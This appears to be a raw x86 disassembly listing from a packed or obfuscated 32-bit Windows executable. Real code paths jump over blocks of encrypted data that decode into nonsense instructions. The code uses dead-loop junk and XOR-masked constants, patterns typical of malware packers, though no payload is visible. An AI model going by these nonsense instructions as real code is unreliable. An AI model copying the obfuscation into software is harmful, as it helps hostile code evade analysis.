  40e32f:	repnz pop ds
  40e331:	pop    esp
  40e332:	stc    
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433617,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433727,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4336eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43366b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4336bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433667,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4336af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	jnp    0x40e3f6
  40e3c1:	loope  0x40e3a2
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e394
  40e3cc:	sbb    al,0x80
  40e3ce:	push   edi
  40e3cf:	cwde   
  40e3d0:	hlt    
  40e3d1:	xchg   edi,eax
  40e3d2:	sub    eax,DWORD PTR [edi-0x4a]
  40e3d5:	shl    BYTE PTR [ebx],cl
  40e3d7:	(bad)  
  40e3d8:	mov    eax,0xa63719ab
  40e3dd:	lea    ebx,[esi+0x1b0e6bbd]
  40e3e3:	aad    0xf1
  40e3e5:	add    eax,0xb71fdecc
  40e3ea:	mov    eax,ds:0xad9182d6
  40e3ef:	inc    ebx
  40e3f0:	pop    esp
  40e3f1:	in     al,0x13
  40e3f3:	pushf  
  40e3f4:	iret   
  40e3f5:	sbb    edx,0x4cbae0b2
  40e3fb:	outs   dx,DWORD PTR ds:[esi]
  40e3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fd:	sti    
  40e3fe:	js     0x40e419
  40e400:	test   DWORD PTR [ecx+0x29e738e0],eax
  40e406:	pusha  
  40e407:	inc    eax
  40e408:	gs int 0x5
  40e40b:	xor    DWORD PTR [ebp-0x1146b464],0x593cf50a
  40e415:	or     al,0x5e
  40e417:	jp     0x40e40f
  40e419:	push   ebp
  40e41a:	aaa    
  40e41b:	inc    eax
  40e41c:	add    ebp,0xffffff85
  40e41f:	adc    BYTE PTR [edi],ah
  40e421:	push   DWORD PTR [ebp-0x28]
  40e424:	jmp    0x3f4cb3fb
  40e429:	jmp    0xc1dcaef7
  40e42e:	mov    ah,dl
  40e430:	mov    ecx,DWORD PTR [esi+0x55]
  40e433:	icebp  
  40e434:	jae    0x40e3c6
  40e436:	ret    
  40e437:	call   0x1ede:0x6bb9f1a6
  40e43e:	pop    esi
  40e43f:	loopne 0x40e46c
  40e441:	retf   
  40e442:	leave  
  40e443:	pop    ss
  40e444:	mov    dh,0xc
  40e446:	retf   0xbbd9
  40e449:	mov    ah,BYTE PTR [ecx-0x1e]
  40e44c:	push   esi
  40e44d:	mov    ebx,DWORD PTR [esi-0x7a]
  40e450:	in     al,0xa6
  40e452:	daa    
  40e453:	in     eax,dx
  40e454:	enter  0x4b5d,0x97
  40e458:	add    DWORD PTR [eax+0x63],0x5c
  40e45c:	adc    DWORD PTR [esi],edi
  40e45e:	mov    bl,0xc
  40e460:	test   BYTE PTR [edx-0x30],ch
  40e463:	sbb    al,BYTE PTR [ebx]
  40e465:	cmp    edi,DWORD PTR [ecx+0x9]
  40e468:	mov    esi,es
  40e46a:	inc    ebp
  40e46b:	fiadd  WORD PTR [edx]
  40e46d:	xor    eax,0x753a7263
  40e472:	les    esp,FWORD PTR [ebx+0x73bf7929]
  40e478:	xchg   ebx,eax
  40e479:	add    DWORD PTR [ebp-0x5b],0x67
  40e47d:	and    BYTE PTR [esi-0x3ae0295],ch
  40e483:	retf   
  40e484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e485:	and    eax,0xdbb5b646
  40e48a:	or     eax,0xf97d6e14
  40e48f:	sbb    eax,0xaef7422f
  40e494:	stos   BYTE PTR es:[edi],al
  40e495:	push   ss
  40e496:	call   0x6b5:0x2b9ac12f
  40e49d:	or     bh,bh
  40e49f:	mov    gs,WORD PTR [ebx-0x3e60e4ca]
  40e4a5:	add    eax,DWORD PTR [esi+0x1]
  40e4a8:	neg    BYTE PTR [ecx]
  40e4aa:	arpl   WORD PTR [ebx+0x3f],si
  40e4ad:	jo     0x40e499
  40e4af:	push   ds
  40e4b0:	mov    esi,ds
  40e4b2:	scas   al,BYTE PTR es:[edi]
  40e4b3:	cmp    esi,DWORD PTR [ecx]
  40e4b5:	xchg   ecx,eax
  40e4b6:	lea    esi,[edx+edi*1-0x449cc2ba]
  40e4bd:	xor    BYTE PTR [eax-0x526d9ae4],0x22
  40e4c4:	mov    ds:0xb2f1155,eax
  40e4c9:	xchg   ecx,eax
  40e4ca:	popa   
  40e4cb:	icebp  
  40e4cc:	adc    BYTE PTR [ebx],ch
  40e4ce:	jmp    0x40e51c
  40e4d0:	sbb    BYTE PTR [ebx],ah
  40e4d2:	aam    0xe9
  40e4d4:	aam    0xa5
  40e4d6:	mov    esp,0xec1b4ba2
  40e4db:	je     0x40e6db
  40e4e1:	add    DWORD PTR ds:0x433733,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433617,0x4336bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433733,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4336a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4336a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4336a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4336a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4336a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4336a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4336a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4336a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4336bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4336b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43367b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0xba1d9328
  40e5c1:	mov    eax,ds:0x7ea5cf06
  40e5c6:	jle    0x40e5d6
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5f0
  40e5cc:	add    al,0xa6
  40e5ce:	(bad)  
  40e5cf:	imul   esi,ebx,0xb3c3bf83
  40e5d5:	jp     0x40e64c
  40e5d7:	xor    esp,DWORD PTR ds:0x3aad136f
  40e5dd:	jb     0x40e5c2
  40e5df:	and    al,0x13
  40e5e1:	in     al,dx
  40e5e2:	dec    ebp
  40e5e3:	push   0x45
  40e5e5:	unpckhps xmm7,XMMWORD PTR [ebp-0xd]
  40e5e9:	ds in  eax,dx
  40e5eb:	dec    ebx
  40e5ec:	dec    eax
  40e5ed:	adc    esi,edi
  40e5ef:	adc    al,BYTE PTR [ebp+0x3ffce733]
  40e5f5:	jg     0x40e660
  40e5f7:	cmp    esp,esp
  40e5f9:	jno    0x40e5d0
  40e5fb:	shl    ebp,0x4d
  40e5fe:	push   edi
  40e5ff:	push   0x78bf87d9
  40e604:	dec    edi
  40e605:	shr    DWORD PTR [edi],1
  40e607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e608:	xlat   BYTE PTR ds:[ebx]
  40e609:	repnz cmp esi,ebp
  40e60c:	lock adc DWORD PTR [ecx-0x3f03eaa5],0x2f
  40e614:	mov    eax,ebx
  40e616:	loope  0x40e5b1
  40e618:	jmp    0xc2ed:0xf93bc0ec
  40e61f:	out    dx,eax
  40e620:	(bad)
  40e625:	mov    esp,0xab0ae943
  40e62a:	sbb    eax,0xc7d41712
  40e62f:	shr    BYTE PTR [ecx],1
  40e631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e632:	mov    al,ds:0x5c7723f2
  40e637:	pop    ebx
  40e638:	dec    esp
  40e639:	pushf  
  40e63a:	call   0x74f:0xcbc1d48c
  40e641:	mov    DWORD PTR [esi-0x13],ebp
  40e644:	rcr    BYTE PTR [eax-0x27373938],0x43
  40e64b:	pop    edi
  40e64c:	mov    dh,0xe9
  40e64e:	cld    
  40e64f:	(bad)  
  40e651:	jl     0x40e6c7
  40e653:	cmc    
  40e654:	(bad)  
  40e655:	stc    
  40e656:	fsub   QWORD PTR [ecx-0xc81a920]
  40e65c:	std    
  40e65d:	icebp  
  40e65e:	adc    al,0xc
  40e660:	adc    edi,esp
  40e662:	sbb    bh,BYTE PTR [ecx-0x69]
  40e665:	and    al,0xe3
  40e667:	enter  0xe32f,0xc5
  40e66b:	mov    BYTE PTR [eax+0x16],bl
  40e66e:	xor    eax,0x7839d412
  40e673:	call   0xb532:0x735b31e
  40e67a:	jbe    0x40e69d
  40e67c:	mov    eax,ds:0xbec18b1
  40e681:	stos   BYTE PTR es:[edi],al
  40e682:	or     bl,BYTE PTR ds:0x753acc2f
  40e688:	imul   eax,esi,0xf68cb614
  40e68e:	xor    BYTE PTR [edi+ebp*4-0x6b3e86b],0xe0
  40e696:	mov    ds:0xdac66dbc,al
  40e69b:	(bad)  
  40e69c:	js     0x40e675
  40e69e:	test   DWORD PTR [eax+0x5fa84acd],0x5988d5b0
  40e6a8:	test   DWORD PTR [esi],edx
  40e6aa:	mov    dh,0x46
  40e6ac:	fldenv [eax+0x1adbd943]
  40e6b2:	pop    ebx
  40e6b3:	loop   0x40e6db
  40e6b5:	jmp    0x40e6be
  40e6b7:	jno    0x40e65c
  40e6b9:	xchg   ah,dh
  40e6bb:	popa   
  40e6bc:	es popa 
  40e6be:	push   ds
  40e6bf:	in     eax,0xd
  40e6c1:	outs   dx,BYTE PTR ds:[esi]
  40e6c2:	loope  0x40e72f
  40e6c4:	sbb    eax,0xa763c876
  40e6c9:	xchg   esp,eax
  40e6ca:	imul   bh
  40e6cc:	ss dec ebp
  40e6ce:	jns    0x40e6b3
  40e6d0:	cmp    BYTE PTR [eax-0x61],ah
  40e6d3:	daa    
  40e6d4:	cmp    eax,0x7743b6b0
  40e6d9:	sbb    eax,eax
  40e6db:	mov    eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x710730a1
  40e707:	aad    0xd7
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	xor    DWORD PTR [ecx+ebx*2],0x61613e94
  40e718:	neg    DWORD PTR [eax-0x19]
  40e71b:	into   
  40e71c:	retf   
  40e71d:	or     eax,0x42e06cb6
  40e722:	cmp    al,BYTE PTR [ebx]
  40e724:	xchg   ebp,eax
  40e725:	push   ecx
  40e726:	push   cs
  40e727:	sub    DWORD PTR [esi-0x1bb0f6fe],edi
  40e72d:	lods   al,BYTE PTR ds:[esi]
  40e72e:	loope  0x40e6e4
  40e730:	js     0x40e746
  40e732:	dec    edx
  40e733:	in     eax,0x6
  40e735:	adc    al,0x72
  40e737:	arpl   WORD PTR [edi+0x17],di
  40e73a:	and    edx,esi
  40e73c:	or     DWORD PTR [eax+0x451af70f],ebx
  40e742:	fs adc ecx,edx
  40e745:	sub    ebx,ebp
  40e747:	(bad)  
  40e748:	leave  
  40e749:	mov    ds:0x214dd75b,eax
  40e74e:	and    BYTE PTR [esi],bh
  40e750:	pop    esi
  40e751:	shl    esi,cl
  40e753:	mov    edi,0x3b2d38a9
  40e758:	xor    ah,dh
  40e75a:	ja     0x40e780
  40e75c:	je     0x40e751
  40e75e:	ret    
  40e75f:	xchg   ebp,eax
  40e760:	mov    DWORD PTR [edi],ebp
  40e762:	loope  0x40e74f
  40e764:	inc    esi
  40e765:	jnp    0x40e6fd
  40e767:	mov    esi,0x1f21cfee
  40e76c:	sub    BYTE PTR [ecx],al
  40e76e:	sbb    al,0x38
  40e770:	add    al,0x9f
  40e772:	es pusha 
  40e774:	(bad)  
  40e775:	cmp    DWORD PTR [ebx+edx*2+0x26793c0d],esp
  40e77c:	icebp  
  40e77d:	popf   
  40e77e:	test   al,0x1f
  40e780:	das    
  40e781:	out    0x49,al
  40e783:	sbb    BYTE PTR [esp+eiz*4-0x20ba9794],bh
  40e78a:	sbb    eax,0xca3ddb36
  40e78f:	or     eax,DWORD PTR [esi+0x33]
  40e792:	and    eax,0x49a0ff1c
  40e797:	mov    bl,0x33
  40e799:	inc    ebx
  40e79a:	mov    ?,WORD PTR [ebx]
  40e79c:	and    BYTE PTR [edx+0x29bd69bb],0xb0
  40e7a3:	push   ds
  40e7a4:	jle    0x40e791
  40e7a6:	cmp    DWORD PTR [ecx-0x1f],0x31
  40e7aa:	push   edi
  40e7ab:	mov    ds:0xec6846e9,al
  40e7b0:	mov    ?,WORD PTR [ecx+0x69c574fe]
  40e7b6:	mov    ebx,0xda4186a1
  40e7bb:	mov    ecx,0xd3447d15
  40e7c0:	push   ss
  40e7c1:	mov    dl,0x58
  40e7c3:	call   0xeea38b69
  40e7c8:	cmp    dl,BYTE PTR [ebx-0x6721163]
  40e7ce:	je     0x40e77e
  40e7d0:	pusha  
  40e7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d2:	lea    ecx,[edi]
  40e7d4:	retf   
  40e7d5:	xchg   dh,ah
  40e7d7:	clc    
  40e7d8:	stc    
  40e7d9:	cs inc esi
  40e7db:	(bad)  
  40e7dc:	pop    edx
  40e7dd:	ja     0x40e791
  40e7df:	je     0x40e830
  40e7e1:	add    ah,BYTE PTR ss:[ecx+0x36]
  40e7e5:	or     ah,bl
  40e7e7:	call   0xb374243a
  40e7ec:	pop    ebp
  40e7ed:	push   ds
  40e7ee:	(bad)  
  40e7f0:	mov    dl,BYTE PTR [ebp+edx*8-0x76]
  40e7f4:	pop    ds
  40e7f5:	push   ds
  40e7f6:	call   0xa9a1:0x590a46d
  40e7fd:	outs   dx,BYTE PTR ds:[esi]
  40e7fe:	aam    0xec
  40e800:	push   0xffffff86
  40e802:	mov    edx,0x155c96ad
  40e807:	or     eax,DWORD PTR [eax-0x1b]
  40e80a:	(bad)  
  40e80b:	dec    esp
  40e80c:	mov    ebp,0x410d85e2
  40e811:	inc    ebx
  40e812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e813:	ds stos DWORD PTR es:[edi],eax
  40e815:	mov    eax,ds:0x9fcd9186
  40e81a:	mov    BYTE PTR [edi+0x26],dh
  40e81d:	add    al,0xfa
  40e81f:	dec    esp
  40e820:	in     eax,dx
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43373f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43373f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43373f,ebx
  40e870:	cmp    DWORD PTR ds:0x43373f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43373f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4336bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4336ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4336ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4336ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43367f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4336ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4336ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4336ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4336f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4336f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4336f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4336f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4336f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4336f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4336f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4336f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4336a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43362b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43361b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43361b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43361b,edi
  40e999:	cmp    DWORD PTR ds:0x43361b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4336bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43361b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43361b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43366b,0x43360f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433737,0x4336bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43367f,0x4336bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4336ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43361f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x26103a68,al
  40ea30:	jp     0x40e9c6
  40ea32:	sub    ch,bh
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	aas    
  40ea3c:	and    edi,ebx
  40ea3e:	push   edi
  40ea3f:	leave  
  40ea40:	lods   eax,DWORD PTR ds:[esi]
  40ea41:	mov    cl,BYTE PTR [ebp+0x737abe9a]
  40ea47:	std    
  40ea48:	mov    esp,DWORD PTR ds:0xea6555b0
  40ea4e:	into   
  40ea4f:	int3   
  40ea50:	call   0xffe54093
  40ea55:	adc    BYTE PTR [ecx+0x43a437ed],ah
  40ea5b:	inc    eax
  40ea5c:	call   0x6fe:0xc2baf111
  40ea63:	loop   0x40ea1b
  40ea65:	mov    edx,0x7cc5601c
  40ea6a:	(bad)  
  40ea6b:	sbb    bl,ah
  40ea6d:	retf   
  40ea6e:	mov    ?,WORD PTR [eax-0x3a1101ee]
  40ea74:	cmp    DWORD PTR [eax+0x1d],esp
  40ea77:	enter  0x9a9f,0x17
  40ea7b:	jmp    0x40ea70
  40ea7d:	pop    edi
  40ea7e:	out    0x3,al
  40ea80:	outs   dx,DWORD PTR ds:[esi]
  40ea81:	inc    ebx
  40ea82:	loope  0x40ea8b
  40ea84:	dec    edx
  40ea85:	data16 add al,0x9d
  40ea88:	(bad)  
  40ea89:	push   esp
  40ea8a:	dec    ecx
  40ea8b:	mov    al,0x4c
  40ea8d:	mov    esp,0x27866b3f
  40ea92:	mov    bh,0xdb
  40ea94:	bound  edx,QWORD PTR [ecx-0x1aa379a8]
  40ea9a:	aas    
  40ea9b:	cmp    dh,BYTE PTR ds:0x74b72428
  40eaa1:	inc    esi
  40eaa2:	mov    dh,0x6c
  40eaa4:	jnp    0x40ea5b
  40eaa6:	mov    cl,0x45
  40eaa8:	and    eax,0x97dabcba
  40eaad:	jae    0x40eaa2
  40eaaf:	and    eax,0x91d0cb33
  40eab4:	out    dx,eax
  40eab5:	and    dh,BYTE PTR [edi+0x4d012d50]
  40eabb:	xchg   BYTE PTR [esp+ebp*4],ah
  40eabe:	icebp  
  40eabf:	ja     0x40ea8d
  40eac1:	stos   BYTE PTR es:[edi],al
  40eac2:	cmp    ebx,DWORD PTR [edi-0x40865272]
  40eac8:	push   es
  40eac9:	pushf  
  40eaca:	cdq    
  40eacb:	cdq    
  40eacc:	dec    edx
  40eacd:	xchg   BYTE PTR [edi],dh
  40eacf:	scas   al,BYTE PTR es:[edi]
  40ead0:	stos   DWORD PTR es:[edi],eax
  40ead1:	mov    cl,BYTE PTR [ebp+0x52d52452]
  40ead7:	xchg   edx,eax
  40ead8:	jmp    0x5778:0xf23ed5e6
  40eadf:	jo     0x40eb2d
  40eae1:	pop    eax
  40eae2:	loop   0x40eaf6
  40eae4:	mov    bl,0x33
  40eae6:	sub    BYTE PTR [esi-0x47],al
  40eae9:	xor    DWORD PTR [esi+0x7b],esp
  40eaec:	xchg   ebp,eax
  40eaed:	(bad)  
  40eaee:	mov    ah,0xb2
  40eaf0:	ret    0xf099
  40eaf3:	lea    esi,[edi-0x2]
  40eaf6:	adc    BYTE PTR [ebp-0x1d],al
  40eaf9:	mov    BYTE PTR [eax-0x7e552ac1],dl
  40eaff:	adc    BYTE PTR [eax+0x24],bl
  40eb02:	ret    
  40eb03:	pop    eax
  40eb04:	in     al,dx
  40eb05:	adc    BYTE PTR [edx],ah
  40eb07:	into   
  40eb08:	xchg   edi,eax
  40eb09:	or     al,0x48
  40eb0b:	pop    edi
  40eb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb0d:	dec    edi
  40eb0e:	pop    es
  40eb0f:	pop    esp
  40eb10:	or     al,bl
  40eb12:	std    
  40eb13:	mov    ebp,0xd19c7bf7
  40eb18:	mov    edi,0x980953dc
  40eb1d:	jbe    0x40eb4f
  40eb1f:	js     0x40ead0
  40eb21:	xchg   esi,eax
  40eb22:	ins    BYTE PTR es:[edi],dx
  40eb23:	pop    ds
  40eb24:	scas   eax,DWORD PTR es:[edi]
  40eb25:	ret    0x8ed9
  40eb28:	xlat   BYTE PTR ds:[ebx]
  40eb29:	add    eax,0xf57d7335
  40eb2e:	pop    edi
  40eb2f:	in     al,dx
  40eb30:	mov    bh,ah
  40eb32:	sbb    DWORD PTR [ebp+0x75de82ac],ebx
  40eb38:	mov    DWORD PTR [esi],ecx
  40eb3a:	into   
  40eb3b:	js     0x40eb0e
  40eb3d:	push   ebx
  40eb3e:	dec    esi
  40eb3f:	nop
  40eb40:	mov    ecx,0x2d1148d3
  40eb45:	jmp    0x684b:0x4ed67c35
  40eb4c:	mov    ebx,0xa8bd1905
  40eb51:	adc    eax,ebx
  40eb53:	and    eax,0x77875c9a
  40eb58:	div    BYTE PTR [ecx-0x1ab07ce4]
  40eb5e:	fs sub eax,0x5bb69fa1
  40eb64:	cs pop es
  40eb66:	push   edi
  40eb67:	rcr    BYTE PTR [edx],cl
  40eb69:	xlat   BYTE PTR ds:[ebx]
  40eb6a:	es ret 0x366f
  40eb6e:	pop    ebp
  40eb6f:	gs push esi
  40eb71:	pop    ebp
  40eb72:	jb     0x40eb65
  40eb74:	jae    0x40ebba
  40eb76:	into   
  40eb77:	xchg   ecx,eax
  40eb78:	pop    ecx
  40eb79:	jmp    0x40eb2d
  40eb7b:	jp     0x40ebbd
  40eb7d:	adc    edi,ebp
  40eb7f:	dec    ebx
  40eb80:	(bad)  
  40eb82:	loope  0x40eb5f
  40eb84:	dec    ebp
  40eb85:	into   
  40eb86:	cmp    eax,0x82b25fb5
  40eb8b:	sti    
  40eb8c:	out    0x5e,eax
  40eb8e:	mov    ds:0x1454d786,al
  40eb93:	out    0xf1,al
  40eb95:	xor    dh,ah
  40eb97:	cmp    bh,BYTE PTR [eax]
  40eb99:	into   
  40eb9a:	sub    DWORD PTR [ecx],esp
  40eb9c:	out    0xa2,eax
  40eb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb9f:	dec    eax
  40eba0:	mov    bl,0x74
  40eba2:	sahf   
  40eba3:	clc    
  40eba4:	arpl   WORD PTR [ebx-0xd68bdf6],bp
  40ebaa:	jnp    0x40eb63
  40ebac:	jnp    0x40ebf4
  40ebae:	pop    ecx
  40ebaf:	push   ds
  40ebb0:	jle    0x40eb43
  40ebb2:	xchg   ebp,eax
  40ebb3:	dec    edx
  40ebb4:	(bad)
  40ebb8:	push   esp
  40ebba:	adc    BYTE PTR [edx-0x1],dl
  40ebbd:	push   ecx
  40ebbe:	das    
  40ebbf:	jno    0x40ebbe
  40ebc1:	es ret 
  40ebc3:	adc    DWORD PTR [eax],edi
  40ebc5:	xchg   edi,eax
  40ebc6:	stos   BYTE PTR es:[edi],al
  40ebc7:	adc    eax,0x9ac75898
  40ebcc:	sbb    al,0xec
  40ebce:	mov    cl,0x7a
  40ebd0:	jbe    0x40eb8a
  40ebd2:	sbb    edi,DWORD PTR [edx]
  40ebd4:	jmp    DWORD PTR [ebx-0x6b6e3899]
  40ebda:	ret    
  40ebdb:	xchg   ecx,eax
  40ebdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebdd:	cdq    
  40ebde:	pop    ss
  40ebdf:	aam    0xd
  40ebe1:	jle    0x40ec1c
  40ebe3:	leave  
  40ebe4:	pop    esi
  40ebe5:	stc    
  40ebe6:	stc    
  40ebe7:	jo     0x40ec33
  40ebe9:	sbb    dl,bh
  40ebeb:	mov    dh,0xb1
  40ebed:	and    al,0x2a
  40ebef:	push   ebx
  40ebf0:	mov    ebx,DWORD PTR [ebx-0x4b]
  40ebf3:	pop    esp
  40ebf4:	and    al,0x21
  40ebf6:	jmp    esi
  40ebf8:	pop    esp
  40ebf9:	(bad)  
  40ebfa:	in     eax,dx
  40ebfb:	popa   
  40ebfc:	fistp  DWORD PTR [esp+eax*8-0x24]
